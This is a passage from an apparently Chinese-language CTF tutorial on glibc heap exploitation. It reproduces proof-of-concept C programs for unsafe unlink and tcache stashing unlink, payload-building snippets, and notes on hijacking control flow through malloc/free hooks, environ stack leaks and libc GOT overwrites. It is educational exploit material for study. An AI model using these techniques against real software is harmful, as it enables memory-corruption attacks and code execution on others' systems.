chunk.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;It&#x27;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n&quot;</span>);</span><br><span class="line">chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been 0x430, however this is its new value: %p\n&quot;</span>,(<span class="type">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We mark our fake chunk as free by setting &#x27;previous_in_use&#x27; of chunk1 as False.\n\n&quot;</span>);</span><br><span class="line">chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n&quot;</span>);</span><br><span class="line"><span class="type">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(victim_string,<span class="string">&quot;Hello!~&quot;</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Original value: %s\n&quot;</span>,victim_string);</span><br><span class="line">chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;New Value: %s\n&quot;</span>,victim_string);</span><br><span class="line"></span><br><span class="line"><span class="comment">// sanity check</span></span><br><span class="line">assert(*(<span class="type">long</span> *)victim_string == <span class="number">0x4141414142424242</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>核心思路:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># chunk 0 ptr store in &amp;ptr</span></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x420</span>) <span class="comment"># not in fastbin or tcache</span></span><br><span class="line">malloc(<span class="number">0x420</span>) </span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0</span>)+p64(fake_size)+p64(&amp;ptr-<span class="number">0x18</span>)+p64(&amp;ptr-<span class="number">0x10</span>)+p64(<span class="number">0</span>)*k + p64(fake_prev_size)+p64(size)) <span class="comment"># fakesize = 0x420-0x10</span></span><br><span class="line"><span class="comment"># need fake_prev_size = prev_size-0x10, sive.PREV_INUSE = 0</span></span><br></pre></td></tr></table></figure><p><strong>限制:</strong></p><ul><li>overflow ,可以修改prev_inuse触发fake chunk  unlink and  consolidate</li><li>主要适用于可以知道堆指针存储基址的情况，可以控制堆管理机构</li></ul><p><strong>效果:</strong></p><ul><li>可以将ptr处地址改写为&amp;ptr-8</li></ul><h2 id="tcache-stashing-unlink">tcache stashing unlink</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the stashing unlink attack on tcache.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This poc has been tested on both glibc-2.27, glibc-2.29 and glibc-2.31.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it&#x27;s necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we&#x27;ll create the chunk on the stack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack_var emulates the fake chunk we want to alloc to.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;First let&#x27;s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc 9 chunks with malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="type">unsigned</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 chunks into tcache</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="type">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">2</span>],(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="type">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>核心思路:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">calloc(<span class="number">0xa0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    calloc(<span class="number">0xa0</span>)</span><br><span class="line">    free(i)</span><br><span class="line">calloc(<span class="number">0x4b0</span>) <span class="comment"># 9 </span></span><br><span class="line">calloc(<span class="number">0xb0</span>) <span class="comment"># 10</span></span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">calloc(<span class="number">0x400</span>)</span><br><span class="line"></span><br><span class="line">calloc(<span class="number">0x4b0</span>) <span class="comment"># 11</span></span><br><span class="line">calloc(<span class="number">0xb0</span>) <span class="comment"># 12</span></span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">calloc(<span class="number">0x400</span>) <span class="comment">#13</span></span><br><span class="line">edit(<span class="number">13</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x400</span>+p64(prev_size)+p64(size)+p64(target_add-<span class="number">0x10</span>))</span><br><span class="line">calloc(<span class="number">0xa0</span>)</span><br></pre></td></tr></table></figure><p><strong>限制:</strong></p><ul><li>需要UAF</li><li>主要适用于只有calloc并且可以分配tcache大小的chunk的情况，对于有malloc，打tcache poison更加方便</li></ul><p><strong>效果:</strong></p><ul><li>获得任意地址target_addr的控制权：在上述流程中，直接将chunk_A的bk改为target_addr - 0x10，并且保证target_addr - 0x10的bk的fd为一个可写地址（一般情况下，使target_addr - 0x10的bk，即target_addr + 8处的值为一个可写地址即可）。</li><li>在任意地址target_addr写入大数值：在unsorted bin attack后，有时候要修复链表，在链表不好修复时，可以采用此利用达到同样的效果，在高版本glibc下，unsorted bin attack失效后，此利用应用更为广泛。在上述流程中，需要使tcache bin中原先有六个堆块，然后将chunk_A的bk改为target_addr - 0x10即可。</li></ul><h2 id="tcache-poison">tcache poison</h2><p>主要是通过改写tcache的next指针，实现类似于fastbin的house of spirit的效果。</p><p>这个技术非常常用，由于tcache基本没有任何检查，如果需要任意地址分配，这是第一个考虑的技术。</p><h2 id="house-of-orange">house of orange</h2><p>house of orange 原利用链中的IO_FILE相关利用已经失效了，这里主要关注其绕过无free函数限制的方法，即通过malloc大于top chunk大小的chunk时会先释放top chunk，再拓展堆区域。</p><p>一般而言，修改top chunk需要满足一下条件。</p><ol><li>伪造的 size 必须要对齐到内存页</li><li>size 要大于 MINSIZE(0x10)</li><li>size 要小于之后申请的 chunk size + MINSIZE(0x10)</li><li>size 的 prev inuse 位必须为 1</li></ol><h1 id="攻击面">攻击面</h1><ul><li>劫持控制流<ul><li>hooks</li><li>stack</li><li>IO_FILE</li><li>dlts</li><li>libc.got</li></ul></li><li>辅助攻击链<ul><li>tcache_perthread_struct</li><li>global_max_fast</li><li>heap 管理结构</li></ul></li></ul><h2 id="劫持控制流">劫持控制流</h2><h3 id="hooks">hooks</h3><p>堆利用中最基本的夺取控制流的方法就是打各种hooks。<br>一般而言，可以利用__free_hook 加 写入’/bin/sh’的堆快实现劫持。</p><p>此外，如果要打one_gadget的话，可以打__malloc_hook，在tcache之前的版本，更多是打__malloc_hook，因为其在main_arena附近，存在许多libc上地址，方便通过错位构造0x7f的size，此外，由于__malloc_hook和__realloc_hook临近，也可以很方便地同时控制这两个hook，然后通过__realloc_hook配合来调整栈帧，方便满足one gadget 条件</p><p>而在glibc2.34版本及以上，各类hooks都已经被移除，因此也需要掌握一些其他的劫持控制流的办法。</p><h3 id="stack">stack</h3><p>在stack overflow 中，通过栈和ROP劫持控制流的方法我们已经不陌生，然而不像stack overflow 天然可以在栈上写入，如果要在heap exploation中通过ROP来劫持控制流，一个无法绕过的问题是栈地址不可知。</p><p>我们都知道程序加载时，环境变量会被压入栈中，可以通过environ指针访问到栈上环境变量。</p><p>查看glibc源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> !_LIBC</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> __environenviron</span></span><br><span class="line"><span class="meta"># <span class="keyword">ifndef</span> HAVE_ENVIRON_DECL</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span> **environ;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>发现这是一个extern变量，在gdb中调试查找</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">    <span class="number">0x7f78a14d4000</span>     <span class="number">0x7f78a1500000</span> r--p    <span class="number">2</span>c000      <span class="number">0</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class="number">.2021</span>/pwn/Hookless/libc.so<span class="number">.6</span></span><br><span class="line">    <span class="number">0x7f78a1500000</span>     <span class="number">0x7f78a1668000</span> r-xp   <span class="number">168000</span>  <span class="number">2</span>c000 /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class="number">.2021</span>/pwn/Hookless/libc.so<span class="number">.6</span></span><br><span class="line">    <span class="number">0x7f78a1668000</span>     <span class="number">0x7f78a16bd000</span> r--p    <span class="number">55000</span> <span class="number">194000</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class="number">.2021</span>/pwn/Hookless/libc.so<span class="number">.6</span></span><br><span class="line">    <span class="number">0x7f78a16bd000</span>     <span class="number">0x7f78a16be000</span> ---p     <span class="number">1000</span> <span class="number">1e9000</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class="number">.2021</span>/pwn/Hookless/libc.so<span class="number">.6</span></span><br><span class="line">    <span class="number">0x7f78a16be000</span>     <span class="number">0x7f78a16c1000</span> r--p     <span class="number">3000</span> <span class="number">1e9000</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class="number">.2021</span>/pwn/Hookless/libc.so<span class="number">.6</span></span><br><span class="line">    <span class="number">0x7f78a16c1000</span>     <span class="number">0x7f78a16c4000</span> rw-p     <span class="number">3000</span> <span class="number">1</span>ec000 /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class="number">.2021</span>/pwn/Hookless/libc.so<span class="number">.6</span></span><br><span class="line">    <span class="number">0x7f78a16c4000</span>     <span class="number">0x7f78a16d3000</span> rw-p     f000      <span class="number">0</span> [anon_7f78a16c4]</span><br><span class="line">    <span class="number">0x7f78a16d3000</span>     <span class="number">0x7f78a16d4000</span> r--p     <span class="number">1000</span>      <span class="number">0</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class="number">.2021</span>/pwn/Hookless/ld.so<span class="number">.2</span></span><br><span class="line">    <span class="number">0x7f78a16d4000</span>     <span class="number">0x7f78a16f8000</span> r-xp    <span class="number">24000</span>   <span class="number">1000</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class="number">.2021</span>/pwn/Hookless/ld.so<span class="number">.2</span></span><br><span class="line">    <span class="number">0x7f78a16f8000</span>     <span class="number">0x7f78a1702000</span> r--p     a000  <span class="number">25000</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class="number">.2021</span>/pwn/Hookless/ld.so<span class="number">.2</span></span><br><span class="line">    <span class="number">0x7f78a1702000</span>     <span class="number">0x7f78a1704000</span> r--p     <span class="number">2000</span>  <span class="number">2e000</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class="number">.2021</span>/pwn/Hookless/ld.so<span class="number">.2</span></span><br><span class="line">    <span class="number">0x7f78a1704000</span>     <span class="number">0x7f78a1706000</span> rw-p     <span class="number">2000</span>  <span class="number">30000</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class="number">.2021</span>/pwn/Hookless/ld.so<span class="number">.2</span></span><br><span class="line">    <span class="number">0x7ffd6bb9e000</span>     <span class="number">0x7ffd6bbc0000</span> rw-p    <span class="number">22000</span>      <span class="number">0</span> [<span class="built_in">stack</span>]</span><br><span class="line">    <span class="number">0x7ffd6bbd4000</span>     <span class="number">0x7ffd6bbd8000</span> r--p     <span class="number">4000</span>      <span class="number">0</span> [vvar]</span><br><span class="line">    <span class="number">0x7ffd6bbd8000</span>     <span class="number">0x7ffd6bbda000</span> r-xp     <span class="number">2000</span>      <span class="number">0</span> [vdso]</span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> --xp     <span class="number">1000</span>      <span class="number">0</span> [vsyscall]</span><br><span class="line">pwndbg&gt; p environ</span><br><span class="line">$<span class="number">1</span> = (<span class="type">char</span> **) <span class="number">0x7ffd6bbbdfc8</span></span><br><span class="line">pwndbg&gt; p &amp;environ</span><br><span class="line">$<span class="number">2</span> = (<span class="type">char</span> ***) <span class="number">0x7f78a16c9ec0</span> &lt;environ&gt;</span><br><span class="line">pwndbg&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到其存在于anon_7f78a16c4段，在libc后，与libc存在固定偏移，猜测这一部分内容与ld 过程有关（笔者暂且还没有查证）</p><p>既然可以通过访问libc偏移地址leak stack地址，那么此时我们就可以通过这个栈地址分配到栈上来ROP了。</p><p>此攻击点的优点是不像IO_FILE的攻击那样，需要触发程序结束时（exit()函数，从main返回，malloc_assert）时清理现场的流程，可以覆盖堆菜单中分配函数或者edit函数的栈来实现攻击。</p><h3 id="libc-got">libc.got</h3><p>checksec libc，会发现其一般开启了Partial RELRO，所以可以考虑写libc的got表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec libc.so.6       </span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>笔者在实际操作时发现，pwntools的elf.got并不能很好解析libc的got段，可以使用IDA来查看。</p><p>以下的got表来自libc2.34</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line">.got.plt:<span class="number">00000000001</span>ED000 ; Segment type: Pure data</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED000 ; Segment permissions: Read/Write</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED000 _got_plt        segment qword public <span class="string">&#x27;DATA&#x27;</span> use64</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED000                 assume cs:_got_plt</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED000                 ;org <span class="number">1</span>ED000h</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED000 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED008 qword_1ED008    dq <span class="number">0</span>                    ; DATA XREF: sub_2C000↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED010 qword_1ED010    dq <span class="number">0</span>                    ; DATA XREF: sub_2C000+<span class="number">6</span>↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED018 off_1ED018      dq offset __strnlen_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED018                                         ; DATA XREF: j___strnlen_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED018                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED020 off_1ED020      dq offset __rawmemchr_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED020                                         ; DATA XREF: j___rawmemchr_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED020                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED028 off_1ED028      dq offset __GI___libc_realloc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED028                                         ; DATA XREF: _realloc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED030 off_1ED030      dq offset __strncasecmp_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED030                                         ; DATA XREF: j___strncasecmp_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED030                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED038 off_1ED038      dq offset _dl_exception_create</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED038                                         ; DATA XREF: __dl_exception_create↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED040 off_1ED040      dq offset __mempcpy_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED040                                         ; DATA XREF: j___mempcpy_ifunc↑r</span><br><span 